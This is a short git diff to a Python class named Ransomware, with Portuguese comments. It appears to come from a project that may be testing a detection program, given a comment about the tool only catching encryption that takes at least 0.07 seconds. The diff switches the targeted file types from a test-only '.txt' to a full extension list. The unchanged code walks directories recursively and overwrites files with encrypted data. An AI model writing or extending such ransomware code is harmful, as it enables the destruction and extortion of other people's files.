@@ -43,8 +43,8 @@ class Ransomware:
             Ransomware.deleteTxt(directory)
 
         # Criar uma lista com as extensões de arquivos
-        #file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
-        file_extensions = [".txt"]
+        file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
+        #file_extensions = [".txt"]
         crypto_count = 0
         # Pegar os arquivos recursivamente para criptografar/descriptografar
         for current_path, _, files_in_current_path in os.walk(directory):
@@ -61,7 +61,6 @@ class Ransomware:
 
                     with open(file_abs_full_path, 'wb') as file_bytes:
                         file_bytes.write(final_data)
-                        # print(str(os.getpid()))
                         # sleep(0.00000001)
                         # O programa só pega se o ransomware demorar no min 0.07s
                 crypto_count += 1
